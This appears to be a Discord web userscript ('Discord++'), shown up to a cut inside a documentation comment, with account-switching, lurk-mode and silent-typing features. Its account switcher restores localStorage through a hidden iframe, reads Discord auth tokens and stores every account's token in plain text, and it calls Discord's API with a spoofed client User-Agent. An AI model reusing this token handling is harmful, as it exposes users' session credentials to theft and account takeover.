// ==UserScript==
// @name Discord++ | Take your discord web experience to the next level
// @version 1.2.3.19
// @iconURL   https://i.ibb.co/7znt13j/30162036.png
// @namespace https://greasyfork.org/en/users/735799
// @license      MIT
// @name:es Discord++ | Lleva tu experiencia de discord web al siguiente nivel
// @name:ja Discord++ |「DISCORD」Webエクスペリエンスを次のレベルに引き上げる
// @name:fr Discord++ | Faites passer votre expérience Web Discord au niveau supérieur
// @name:ko Discord++ | Take your Discord web experience to the next level
// @name:zh-CN Discord++ | 使您的discord web体验更上一层楼
// @name:zh-TW Discord++ | 使您的discord web體驗更上一層樓
// @name:pt Discord++ | Leve sua experiência de discórdia na web para o próximo nível
// @name:pt-PT Discord++ | Leve sua experiência de discórdia na web para o próximo nível
// @name:pt-BR Discord++ | Leve sua experiência de discórdia na web para o próximo nível
// @name:ro Discord++ | Luați experiența dvs. web discord la nivelul următor
// @name:ru Discord++ | Поднимите свой опыт работы с Discord в Интернете на новый уровень
// @name:it Discord++ | Porta la tua esperienza web con Discord al livello successivo
// @author @FoxCode
// @description Discord++ adds tons of features to your web browser discord! Custom backgrounds, Account-Switcher, Log deleted messages, custom colors, smooth and new animations, better optimization, no rate limits, and much much more! It also comes with it's own theme (it can be disabled).
// @description:es ¡Discord ++ agrega toneladas de características a discord web! Fondos personalizados, registro de mensajes eliminados, colores personalizados, animaciones nuevas y suaves, mejor optimización, sin límites de velocidad y mucho más. También viene con su propio tema (se puede desactivar).
// @description:ja Discord ++はあなたのウェブブラウザの不和にたくさんの機能を追加します！ カスタム背景、ログ削除されたメッセージ、カスタムカラー、スムーズで新しいアニメーション、より良い最適化、レート制限なし、その他多数！ また、独自のテーマが付属しています（無効にすることができます）。
// @description:fr Discord ++ ajoute des tonnes de fonctionnalités à la discorde de votre navigateur Web! Arrière-plans personnalisés, journal des messages supprimés, couleurs personnalisées, animations fluides et nouvelles, meilleure optimisation, aucune limite de débit et bien plus encore! Il est également livré avec son propre thème (il peut être désactivé).
// @description:ko Discord ++는 웹 브라우저의 discord에 수많은 기능을 추가합니다! 사용자 정의 배경, 로그 삭제 메시지, 사용자 정의 색상, 매끄럽고 새로운 애니메이션, 더 나은 최적화, 속도 제한 없음, 그리고 훨씬 더! 또한 자체 테마와 함께 제공됩니다 (비활성화 할 수 있음).
// @description:zh-CN Discord ++为您的Web浏览器的不和谐添加了许多功能！ 自定义背景，记录已删除的消息，自定义颜色，平滑和新的动画，更好的优化，无速率限制等等！ 它还带有它自己的主题（可以禁用）。
// @description:zh-TW Discord ++為您的Web瀏覽器的不和諧添加了許多功能！ 自定義背景，記錄已刪除的消息，自定義顏色，平滑和新的動畫，更好的優化，無速率限制等等！ 它還帶有它自己的主題（可以禁用）。
// @description:pt-BR Discord ++ adiciona toneladas de recursos à discórdia do seu navegador da web! Planos de fundo personalizados, logs de mensagens excluídos, cores personalizadas, animações novas e suaves, melhor otimização, sem limites de taxa e muito, muito mais! Ele também vem com seu próprio tema (pode ser desativado).
// @description:pt-PT Discord ++ adiciona toneladas de recursos à discórdia do seu navegador da web! Planos de fundo personalizados, logs de mensagens excluídos, cores personalizadas, animações novas e suaves, melhor otimização, sem limites de taxa e muito, muito mais! Ele também vem com seu próprio tema (pode ser desativado).
// @description:pt Discord ++ adiciona toneladas de recursos à discórdia do seu navegador da web! Planos de fundo personalizados, logs de mensagens excluídos, cores personalizadas, animações novas e suaves, melhor otimização, sem limites de taxa e muito, muito mais! Ele também vem com seu próprio tema (pode ser desativado).
// @description:ro Discord ++ adaugă multe funcții discordiei browserului dvs. web! Fundaluri personalizate, jurnale de mesaje șterse, culori personalizate, animații netede și noi, optimizare mai bună, fără limite de rată și multe altele! De asemenea, vine cu propria temă (poate fi dezactivată).
// @description:ru Discord ++ добавляет множество функций в Discord вашего веб-браузера! Пользовательские фоны, удаленные журналы сообщений, пользовательские цвета, плавная и новая анимация, улучшенная оптимизация, отсутствие ограничений по скорости и многое другое! Он также имеет собственную тему (ее можно отключить).
// @description:it Discord ++ aggiunge tonnellate di funzionalità alla discordia del tuo browser web! Sfondi personalizzati, registri dei messaggi eliminati, colori personalizzati, animazioni nuove e fluide, migliore ottimizzazione, nessun limite di velocità e molto altro ancora! Inoltre viene fornito con il proprio tema (può essere disabilitato).
// @grant        GM_registerMenuCommand
// @grant        GM_unregisterMenuCommand
// @grant none
// @match        https://discordapp.com/activ*
// @match        https://discordapp.com/channel*
// @match        https://discord.com/activ*
// @match        https://discord.com/channel*
// @match        https://discord.com/channels/*
// @include https://discord.com/*
// @require https://greasyfork.org/scripts/21927-arrive-js/code/arrivejs.js?version=198809
// @require http://code.jquery.com/jquery-latest.js
// @require      https://cdn.jsdelivr.net/lodash/4.17.2/lodash.min.js
// @require      https://code.jquery.com/jquery-3.1.1.min.js
// ==/UserScript==
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| @grant compatibility |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
function GM_addStyle(aCss) {
  var head = document.getElementsByTagName('head')[0];
  if (head) {
    var style = document.createElement('style');
    style.setAttribute('type', 'text/css');
    style.textContent = aCss;
    head.appendChild(style);
    return style;
  }
  return null;
}

const GM_log = console.log;

// This naive implementation will simply fail to do cross-domain requests,
// just like any javascript in any page would.
function GM_xmlhttpRequest(aOpts) {
  var req = new XMLHttpRequest();

  __setupRequestEvent(aOpts, req, 'abort');
  __setupRequestEvent(aOpts, req, 'error');
  __setupRequestEvent(aOpts, req, 'load');
  __setupRequestEvent(aOpts, req, 'progress');
  __setupRequestEvent(aOpts, req, 'readystatechange');

  req.open(aOpts.method, aOpts.url, !aOpts.synchronous,
      aOpts.user || '', aOpts.password || '');
  if (aOpts.overrideMimeType) {
    req.overrideMimeType(aOpts.overrideMimeType);
  }
  if (aOpts.headers) {
    for (var prop in aOpts.headers) {
      if (Object.prototype.hasOwnProperty.call(aOpts.headers, prop)) {
        req.setRequestHeader(prop, aOpts.headers[prop]);
      }
    }
  }
  var body = aOpts.data ? aOpts.data : null;
  if (aOpts.binary) {
    return req.sendAsBinary(body);
  } else {
    return req.send(body);
  }
}

function __setupRequestEvent(aOpts, aReq, aEventName) {
  if (!aOpts['on' + aEventName]) return;

  aReq.addEventListener(aEventName, function(aEvent) {
    var responseState = {
      responseText: aReq.responseText,
      responseXML: aReq.responseXML,
      readyState: aReq.readyState,
      responseHeaders: null,
      status: null,
      statusText: null,
      finalUrl: null
    };
    switch (aEventName) {
      case "progress":
        responseState.lengthComputable = aEvent.lengthComputable;
        responseState.loaded = aEvent.loaded;
        responseState.total = aEvent.total;
        break;
      case "error":
        break;
      default:
        if (4 != aReq.readyState) break;
        responseState.responseHeaders = aReq.getAllResponseHeaders();
        responseState.status = aReq.status;
        responseState.statusText = aReq.statusText;
        break;
    }
    aOpts['on' + aEventName](responseState);
  });
}

const __GM_STORAGE_PREFIX = [
    '', GM_info.script.namespace, GM_info.script.name, ''].join('***');

// All of the GM_*Value methods rely on DOM Storage's localStorage facility.
// They work like always, but the values are scoped to a domain, unlike the
// original functions.  The content page's scripts can access, set, and
// remove these values.  A
function GM_deleteValue(aKey) {
  localStorage.removeItem(__GM_STORAGE_PREFIX + aKey);
}

function GM_getValue(aKey, aDefault) {
  var val = localStorage.getItem(__GM_STORAGE_PREFIX + aKey);
  if (null === val && 'undefined' != typeof aDefault) return aDefault;
  return val;
}

function GM_listValues() {
  var prefixLen = __GM_STORAGE_PREFIX.length;
  var values = [];
  var i = 0;
  for (var i = 0; i < localStorage.length; i++) {
    var k = localStorage.key(i);
    if (k.substr(0, prefixLen) === __GM_STORAGE_PREFIX) {
      values.push(k.substr(prefixLen));
    }
  }
  return values;
}

function GM_setValue(aKey, aVal) {
  localStorage.setItem(__GM_STORAGE_PREFIX + aKey, aVal);
}

function GM_getResourceURL(aName) {
  return 'greasemonkey-script:' + GM_info.uuid + '/' + aName;
}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Multiple Accounts ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
(function() {
    'use strict';
    const v = "1.6";
    const apiPrefix = "https://discord.com/api/v8";
    let neededClasses = [];  
    let functionKeeper = webpackJsonp[0][1];
        
    let classesContain = [
        ["menu","scroller","styleFixed","styleFlexible","item","hideInteraction","customItem","labelContainer","label","subtext","iconContainer","icon","hintContainer","imageContainer","caret","image","disabled","separator","submenuContainer","submenuPaddingContainer","submenu","colorDefault","checkbox","radioSelection","check","focused","colorBrand","colorDanger","colorPremium","groupLabel"],
        ["statusItem","status","icon","description","customStatusItem","customStatusWithEmoji","customEmoji","customEmojiPlaceholder","customText","clearStatusButton","clearStatusIcon"],
        ["layerContainer","layer","layerHidden","disabledPointerEvents"],
        ["backdrop","backdropWithLayer"],
        ["backdrop","layer"],
        ["responsiveWidthMobile","innerPadding","focusLock","root","small","medium","large","fullscreenOnMobile","footer","header","separator","content","close","hideOnFullscreen"],
        ["artHeight","emojiSize","emojiMargin","formGroup","modalRoot","inputContainer","modalCloseButton","headerText","emojiButton","fullOpacity","emojiButtonContainer","emoji","input","clearButton","clearIcon","headerContainer","header","art","cancelButton"],
        ["_flex","_horizontal","_horizontalReverse","flex","horizontal","horizontalReverse","flexChild","flexMarginReset"],
        ["flex","alignStart","alignEnd","alignCenter","alignStretch","alignBaseline","justifyStart","justifyEnd","justifyCenter","justifyAround","justifyBetween","noWrap","wrap","wrapReverse","directionRow","directionRowReverse","directionColumn","spacer","vertical","horizontal","horizontalReverse","flexCenter"],
        ["button","lookFilled","colorBrand","spinnerItem","lookInverted","lookOutlined","lookGhost","lookLink","contents","hoverBrand","hasHover","colorGrey","hoverGrey","colorRed","hoverRed","colorGreen","hoverGreen","colorYellow","hoverYellow","colorLink","hoverLink","colorWhite","hoverWhite","colorBlack","hoverBlack","colorPrimary","hoverPrimary","colorTransparent","hoverTransparent","lookBlank","sizeTiny","sizeSmall","sizeMedium","sizeLarge","sizeXlarge","sizeMin","sizeMax","sizeIcon","grow","fullWidth","submitting","spinner","disabledButtonWrapper","disabledButtonOverlay"],
        ["scrollerBase","thin","fade","scrolling","auto","none","content","disableScrollAnchor"],
        ["container","downloadProgressCircle","guilds","base","sidebar","hasNotice","panels","content","activityPanel","hiddenOnMobileStore"],
        ["notice","colorDefault","button","colorNeutral","colorDownload","colorNotification","colorDark","colorPremium","colorPremiumTier1","colorPremiumTier2","colorInfo","colorSuccess","colorDanger","colorStreamerMode","colorSpotify","platformIcon","colorBrand","colorCustom","closeButton","buttonMinor"],
    ];
    let ccSet = [];
    for (let i = 0; i < classesContain.length; i++) {
        const element = classesContain[i];
        ccSet.push(new Set(element));
    }
    for (const key in functionKeeper) {
        if (functionKeeper.hasOwnProperty(key)) {
            const element = functionKeeper[key];
            let ans = {};
            element(ans);
            ans = ans.exports;
            if(ans != undefined || ans != null){
                ans = Object.keys(ans);
                let a = new Set(ans);
                for (let j = 0; j < ccSet.length; j++) {
                    const element2 = ccSet[j];
                    if(eqSet(element2, a)){
                        neededClasses[j] = key;
                    }
                }
            }
        }
    }
    function eqSet(as, bs) {
        if (as.size !== bs.size) return false;
        for (var a of as) if (!bs.has(a)) return false;
        return true;
    }
    let allClasses = {};
    const createElm = (html) => {
        const temp = document.createElement('div');
        temp.innerHTML = html;
        return temp.removeChild(temp.firstElementChild);
        //webpackJsonp[0][1][neededClasses[0]].toString(); is the way
    }
    const insertCss = (css) => {
        const style = document.createElement('style');
        style.appendChild(document.createTextNode(css));
        document.head.appendChild(style);
        return style;
    }
    insertCss(`.customAccount {background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI0I5QkJCRSIgd2lkdGg9IjE4cHgiIGhlaWdodD0iMThweCI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPjxwYXRoIGQ9Ik0xNiAxMWMxLjY2IDAgMi45OS0xLjM0IDIuOTktM1MxNy42NiA1IDE2IDVjLTEuNjYgMC0zIDEuMzQtMyAzczEuMzQgMyAzIDN6bS04IDBjMS42NiAwIDIuOTktMS4zNCAyLjk5LTNTOS42NiA1IDggNUM2LjM0IDUgNSA2LjM0IDUgOHMxLjM0IDMgMyAzem0wIDJjLTIuMzMgMC03IDEuMTctNyAzLjVWMTloMTR2LTIuNWMwLTIuMzMtNC42Ny0zLjUtNy0zLjV6bTggMGMtLjI5IDAtLjYyLjAyLS45Ny4wNSAxLjE2Ljg0IDEuOTcgMS45NyAxLjk3IDMuNDVWMTloNnYtMi41YzAtMi4zMy00LjY3LTMuNS03LTMuNXoiLz48L3N2Zz4=);background-size: contain;background-repeat: no-repeat;}
               .changeAccount {grid-area: icon;margin-left: -2px;width: 16px;height: 16px;}
               .accountChooserContainer {display: flex;height: 70px;}
               .accountChooserAvatar {border-radius: 50%; align-self: center;height: 80%;}
               .accountName {align-self: center;font-size: x-large;font-weight: 400;color: var(--interactive-active);}
               .accountLogin {margin-left: auto;align-self: center;padding: 8px 20px;background-color: #43b581;font-weight: 900;color: #fff;border-radius: 5px;}
               .accountLogin:hover {background-color: #3ca374;}
               .accountDiscriminator{align-self: center;margin-top: 7px;color: var(--header-secondary);}
               #addAccount{margin-left: auto;margin: 10px auto;color: var(--header-secondary);cursor: pointer;}
               #addAccount:hover{text-decoration: underline;}
               .versionNotifier {background-color: #6b1ba7;}
               #changeLogButtonClick:hover {color: #6b1ba7;}
        `);
    function parseAllClasses(){
        for (var i = 0; i < neededClasses.length; i++) {
            let x = {};
            webpackJsonp[0][1][neededClasses[i]](x);
            allClasses[neededClasses[i]] = x.exports;
        }
        console.log(allClasses);
    }
    window.onclick = () => {
        let cont = document.getElementsByClassName(allClasses[neededClasses[0]].scroller);
        if(cont.length > 0 && !document.getElementById("status-picker-account")){
            cont[0].appendChild(createElm(`<div role="separator" class="${allClasses[neededClasses[0]].separator}"></div>`));
            let elmnt = createElm(`<div class="${allClasses[neededClasses[0]].item} ${allClasses[neededClasses[0]].colorDefault}" aria-disabled="false" role="menuitem" id="status-picker-account" tabindex="-1"><div class="${allClasses[neededClasses[1]].statusItem}" aria-label="Set a custom status"><div class="changeAccount customAccount"></div><div class="${allClasses[neededClasses[1]].status}">Change account</div></div></div>`);
            elmnt.onmouseover = () => {
                let allElmnts = document.getElementsByClassName(allClasses[neededClasses[0]].item);
                for (var i = 0; i < allElmnts.length; i++) {
                    allElmnts[i].classList.remove(allClasses[neededClasses[0]].focused);
                }
                elmnt.classList.add(allClasses[neededClasses[0]].focused);
            }
            elmnt.onmouseleave = () => {
                let allElmnts = document.getElementsByClassName(allClasses[neededClasses[0]].item);
                for (var i = 0; i < allElmnts.length; i++) {
                    allElmnts[i].classList.remove(allClasses[neededClasses[0]].focused);
                }
            }
            elmnt.onclick = openPicker;
            cont[0].appendChild(elmnt);
        }
        if(localStorage.versionMA != v && !document.getElementsByClassName("versionNotifier")[0]){
            let baseElement = document.getElementsByClassName(allClasses[neededClasses[11]].base);
            if(baseElement[0]){
                baseElement[0].prepend(createElm(`<div class="${allClasses[neededClasses[12]].notice} ${allClasses[neededClasses[12]].colorDefault} versionNotifier"><div class="${allClasses[neededClasses[12]].closeButton}" id="versionNotifierCloseButton" aria-label="Dismiss" role="button" tabindex="0"></div>Multiple Discord Accounts ${v} makes corners rounder!<button id="changeLogButtonClick" class="${allClasses[neededClasses[12]].button}">View changes</button></div>`));
                document.getElementById("changeLogButtonClick").onclick = () => {
                    window.open("https://github.com/cazeip/MultipleAccounts/blob/master/changes.md");
                    document.getElementsByClassName("versionNotifier")[0].remove();
                    localStorage.versionMA = v;
                }
                document.getElementById("versionNotifierCloseButton").onclick = () => {
                    document.getElementsByClassName("versionNotifier")[0].remove();
                    localStorage.versionMA = v;
                }
            }
        }
    }
    function getUserInfo(){
        window.dispatchEvent(new Event('beforeunload'));
        let currentToken = JSON.parse(localStorage.getItem("token"));
        return fetch(apiPrefix + "/users/@me", {
            headers: {
                Accept: "*/*",
                "Accept-Language": "en-US",
                Authority: "discordapp.com",
                Authorization: currentToken,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.301 Chrome/56.0.2924.87 Discord/1.6.15 Safari/537.36",
            },
            method: "GET",
        }).then((res) => (res.status === 200 ? res.json() : Promise.resolve()))
          .catch(console.error);
    }
    function getUser(userID){
        window.dispatchEvent(new Event('beforeunload'));
        let currentToken = JSON.parse(localStorage.getItem("token"));
        return fetch(apiPrefix + "/users/"+userID, {
            headers: {
                Accept: "*/*",
                "Accept-Language": "en-US",
                Authority: "discordapp.com",
                Authorization: currentToken,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.301 Chrome/56.0.2924.87 Discord/1.6.15 Safari/537.36",
            },
            method: "GET",
        }).then((res) => (res.status === 200 ? res.json() : Promise.resolve()))
          .catch(console.error);
    }
    async function fillLocalStorage(){
        let info = await getUserInfo();
        window.dispatchEvent(new Event('beforeunload'));
        info.token = JSON.parse(localStorage.getItem("token"));
        localStorage.setItem("multipleAccounts", JSON.stringify([{id:info.id, token: info.token}]));
    }
    function apiCall(apiPath, body, method = "GET"){
        window.dispatchEvent(new Event('beforeunload'));
        let currentToken = JSON.parse(localStorage.getItem("token"));
        return fetch(apiPrefix + apiPath, {
            body: body ? JSON.stringify(body) : undefined,
            headers: {
                Accept: "*/*",
                "Accept-Language": "en-US",
                Authority: "discordapp.com",
                Authorization: currentToken,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.301 Chrome/56.0.2924.87 Discord/1.6.15 Safari/537.36",
            },
            method,
        }).then((res) => (res.status === 200 ? res.json() : Promise.resolve()))
          .catch(console.error);
    }
    function changeAccount(newToken){
        window.dispatchEvent(new Event('beforeunload'));
        let token = JSON.parse(localStorage.token);
        apiCall("/auth/logout", {"provider":null,"voip_provider":null}, "POST");
        window.location.href = "http://discord.com/login";
        localStorage.token = "\""+newToken+"\"";
        if (newToken == "--[LogIn]--") {
            localStorage.removeItem("token");
        }
    }
    async function openPicker(){
        if(localStorage.getItem("multipleAccounts") == null || localStorage.getItem("multipleAccounts") == undefined){
            await fillLocalStorage();
        }else{
            let info = await getUserInfo();
            let localSt = JSON.parse(localStorage.getItem("multipleAccounts"));
            let def = false;
            for (let i = 0; i < localSt.length; i++) {
                if(localSt[i].id === info.id){
                    def = true;
                }
            }
            if(!def){
                localSt.push({id: info.id, token: JSON.parse(localStorage.getItem("token"))});
            }
            localStorage.setItem("multipleAccounts", JSON.stringify(localSt));
        }
        let info = JSON.parse(localStorage.getItem("multipleAccounts"));
        if(document.getElementById("accountPickerModal")) return;
        let a = document.getElementsByClassName(allClasses[neededClasses[2]].layerContainer);
        let y = createElm(`<div id="accountPickerBg" class="${allClasses[neededClasses[3]].backdropWithLayer}" style="opacity: 0; background-color: rgb(0, 0, 0); transform: translateZ(0px);transition: opacity 0.2s;"></div>`);
        y.onclick = closePicker;
        a[a.length - 1].appendChild(y);
        let x = createElm(`<div class="${allClasses[neededClasses[4]].layer}" id="accountPickerModal"> <div class="${allClasses[neededClasses[5]].focusLock}" role="dialog" aria-label="Set a custom status" tabindex="-1" aria-modal="true"> <div class="${allClasses[neededClasses[6]].modalRoot} ${allClasses[neededClasses[5]].root} ${allClasses[neededClasses[5]].small} ${allClasses[neededClasses[5]].fullscreenOnMobile}" id="animatedModal" style="opacity: 0;transform: scale(0.2);transition: transform .2s, opacity .2s;"> <div class="${allClasses[neededClasses[7]].flex} ${allClasses[neededClasses[7]]._horizontal} ${allClasses[neededClasses[8]].justifyStart} ${allClasses[neededClasses[8]].alignCenter} ${allClasses[neededClasses[8]].noWrap} ${allClasses[neededClasses[5]].header} ${allClasses[neededClasses[6]].headerContainer}" id="replaceBackground" style="flex: 0 0 auto;background-position: bottom;background-size: cover;background-image: url(https://cdn.discordapp.com/attachments/768475463524941865/768481090087944233/pawel-nolbert-4u2U8EO9OzY-unsplash.jpg);padding: 30px;"> <div class="${allClasses[neededClasses[6]].header}" style="padding-top: 0;"><h4 class="${allClasses[neededClasses[6]].headerText}">Choose a Discord account</h4></div><button id="closeXbutton" aria-label="Close" type="button" class="${allClasses[neededClasses[5]].close} ${allClasses[neededClasses[6]].modalCloseButton} ${allClasses[neededClasses[9]].button} ${allClasses[neededClasses[9]].lookBlank} ${allClasses[neededClasses[9]].colorBrand} ${allClasses[neededClasses[9]].grow}"> <div class="${allClasses[neededClasses[9]].contents}"> <svg aria-hidden="false" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M18.4 4L12 10.4L5.6 4L4 5.6L10.4 12L4 18.4L5.6 20L12 13.6L18.4 20L20 18.4L13.6 12L20 5.6L18.4 4Z"></path></svg> </div></button> </div><div id="accountLinesContainer" class="${allClasses[neededClasses[5]].content} ${allClasses[neededClasses[10]].thin}" dir="ltr" style="overflow: hidden scroll; padding-right: 8px; padding-top: 10px;"></div><span id="addAccount">Not seeing your account? Click here to add one.</span></div></div></div>`);
        a[a.length - 1].appendChild(x);
        document.getElementById("closeXbutton").onclick = closePicker;
        document.getElementsByClassName(allClasses[neededClasses[2]].layer)[0].style.display = "none";
        document.getElementById("addAccount").onclick = () => {
            changeAccount("--[LogIn]--");
        }
        setTimeout(async () => {
            document.getElementById("accountPickerBg").style.opacity = "0.85";
            document.getElementById("animatedModal").style.transform = "scale(1)";
            document.getElementById("animatedModal").style.opacity = "1";
            for (let i = 0; i < info.length; i++) {
                let line;
                let user = await getUser(info[i].id);
                if(user.avatar == null){
                    line = createElm(`<div class="accountChooserContainer"><img class="accountChooserAvatar" src="https://cdn.discordapp.com/embed/avatars/${user.discriminator % 5}.png"><div style="margin-left: 20px;align-self: center;display: flex;flex-direction: column;"><div><span class="accountName">${user.username}</span><span class="accountDiscriminator">#${user.discriminator}</span></div><span style="color: var(--text-muted);padding-top: 2px;padding-left: 0;">ID: ${user.id}</span></div><button id="AccountSwitchButton${i}" class="accountLogin">Log in</button></div>`);
                }else{
                    line = createElm(`<div class="accountChooserContainer"><img class="accountChooserAvatar" src="https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128"><div style="margin-left: 20px;align-self: center;display: flex;flex-direction: column;"><div><span class="accountName">${user.username}</span><span class="accountDiscriminator">#${user.discriminator}</span></div><span style="color: var(--text-muted);padding-top: 2px;padding-left: 0;">ID: ${user.id}</span></div><button id="AccountSwitchButton${i}" class="accountLogin">Log in</button></div>`);
                }
                document.getElementById("accountLinesContainer").appendChild(line);
                document.getElementById("AccountSwitchButton"+i).onclick = () => {
                    changeAccount(info[i].token);
                }
            }
        }, 100);
    }
    function closePicker(){
        document.getElementById("accountPickerBg").style.opacity = "0";
        document.getElementById("animatedModal").style.transform = "scale(0.2)";
        document.getElementById("animatedModal").style.opacity = "0";
        setTimeout( () => {
            document.getElementById("accountPickerBg").remove();
            document.getElementById("accountPickerModal").remove();
        }, 201);
    }
    window.localStorage = document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage;
    parseAllClasses();
})();
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Lurk-Mode Switch |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
function createBox() {
    if (document.getElementsByTagName('textarea')[0] || document.querySelector(".markup-2BOw-j.slateTextArea-1Mkdgw")){
        var frag = document.createDocumentFragment();
        var outDiv = document.createElement("DIV");
        outDiv.className = "lurkDiv";
        var outLabel = document.createElement("LABEL");
        outLabel.className = "lurkSwitch";
        var outSpan = document.createElement("SPAN");
        outSpan.className = "lurkSlider round";
        var checkBox = document.createElement("input");
        checkBox.type = "checkbox";
        checkBox.id = "checker";
        var style = document.createElement("style");
        var sheet = document.head.appendChild(style).sheet;
        sheet.insertRule('.lurkSwitch {position: relative; display: inline-block; width: 25px; height: 15px;}',sheet.cssRules.length);
        sheet.insertRule('.lurkSwitch input {display:none;}',sheet.cssRules.length);
        sheet.insertRule('.lurkSlider {position: absolute;cursor: pointer;top: 0;left: 0;right: 0;bottom: 0;background-color: var(--Color005);-webkit-transition: .2s;transition: .2s;}',sheet.cssRules.length);
        sheet.insertRule('.lurkSlider:before {position: absolute;content: "";height: 15px; width: 15px;left: 0px;bottom: 0px;background-color: #262A2D;-webkit-transition: .2s;transition: .2s;}',sheet.cssRules.length);
        sheet.insertRule('input:checked + .lurkSlider {background-color: white;}',sheet.cssRules.length);
        sheet.insertRule('input:focus + .lurkSlider.round {box-shadow: 0px 0px 0px 3px white;}',sheet.cssRules.length);
        sheet.insertRule('input:checked + .lurkSlider.round {box-shadow: 0px 0px 0px 3px white;}',sheet.cssRules.length);
        sheet.insertRule('input:checked + .lurkSlider:before {background-color: var(--Color005); -webkit-transform: translateX(10px);-ms-transform: translateX(10px);transform: translateX(10px);}',sheet.cssRules.length);
        sheet.insertRule('.lurkSlider.round {box-shadow: 0px 0px 0px 3px var(--Color005); border-radius: 3px; border-bottom-right-radius: 0px; border-bottom-left-radius: 0px;}',sheet.cssRules.length);
        sheet.insertRule('.lurkSlider.round:before {border-radius: 100%;}',sheet.cssRules.length);
        sheet.insertRule('.lurkDiv {padding-top: 7px; position: fixed; z-index: 999; padding-left: 40px;}',sheet.cssRules.length);
        frag.appendChild(outDiv);
        outDiv.appendChild(outLabel);
        outLabel.appendChild(checkBox);
        outLabel.appendChild(outSpan);
        var appFront = document.getElementById('app-mount');
        appFront.parentNode.insertBefore(frag, appFront.nextSibling);
    } else {
        setTimeout(createBox,1000);
    }
}

function recheck(){
    var messageBox = document.querySelector(".markup-2BOw-j.slateTextArea-1Mkdgw");
    var preMessageBox = document.getElementsByTagName('textarea')[0];
    if (messageBox) {
        if (document.getElementById('checker').checked === true) {
            messageBox.setAttribute('contentEditable', false);
            messageBox.setAttribute("style", "outline: none; white-space: pre-wrap; overflow-wrap: break-word;");
        } else {
            messageBox.setAttribute('contentEditable', true);
            messageBox.setAttribute("style", "outline: none; white-space: pre-wrap; overflow-wrap: break-word; -webkit-user-modify: none;");
        }
    }
    if (preMessageBox) {
        if (document.getElementById('checker').checked === true) {
            preMessageBox.setAttribute('disabled', true);
        } else {
            preMessageBox.removeAttribute('disabled');
        }
    }
}

window.addEventListener("load", createBox, false);
window.addEventListener("click", recheck, false);

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Silent Typing ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
(function () {
    "use strict";

    let cancel = null;

    const start = function () {
        const module = WebpackModules.findByUniqueProperties(["startTyping"]);
        if (!module) {
            console.error("SilentTyping:", "unable to monkey patch sendTyping method");
            return;
        }
        cancel = monkeyPatch(module, "startTyping", {instead: ()=>{}});
    };

    const stop = function () {
        if (cancel) {
            cancel();
            cancel = null;
        }
    };

    /**
     * Function with no arguments and no return value that may be called to reverse changes that is done by {@link monkeyPatch} method, restoring (unpatching) original method.
     * @callback cancelPatch
     */

    /**
     * This is a shortcut for calling original method using this and arguments from data object. This is a function without input arguments. This function is defined as `() => data.returnValue = data.originalMethod.apply(data.thisObject, data.methodArguments)`
     * @callback originalMethodCall
     * @return {*} The same value, which is returned from original method, also this value would be written into `data.returnValue`
     */

    /**
     * A callback that modifies method logic. Callback is called on each call of original method and have all data about original call. Any of the data can be modified if you need, but do it wisely.
     * @callback doPatchCallback
     * @param {PatchData} data Data object with all information about current that you may need in your patching callback.callback.
     * @return {*} Makes sense only when used as `instead` parameter in {@link monkeyPatch}. If returned something other then undefined - it replaces value in `returnValue` param. If used as `before` or `after` parameters - return value if ignored.
     */

    /**
     * This is function for monkey-patching any object method. Can make patch before, after or instead of target method.
     * Be careful when monkey-patching. Think not only about original functionality of target method and you changes, but also about develovers of other plugins, who may also patch this method before or after you. Try to change target method behaviour little as you can, and try to never change method signatures.
     * By default this function makes log messages about each patching and unpatching, so you and other developers can see what methods a patched. This messages may be suppressed.
     * Display name of patched method is changed, so you can see if function is patched and how many times while debuging or in the stack trace. Also patched function have property `__monkeyPatched` is set to true, in case you want to check something programmatically.
     *
     * @author samogot
     * @param {object} what Object to be patched. You can can also pass class prototypes to patch all class instances. If you are patching prototype of react component you may also need {@link Renderer.rebindMethods}.
     * @param {string} methodName The name of the target message to be patched.
     * @param {object} options Options object. You should provide at least one of `before`, `after` or `instead` parameters. Other parameters are optional.
     * @param {doPatchCallback} options.before Callback that will be called before original target method call. You can modify arguments here, so it will be passed to original method. Can be combined with `after`.
     * @param {doPatchCallback} options.after Callback that will be called after original target method call. You can modify return value here, so it will be passed to external code which calls target method. Can be combined with `before`.
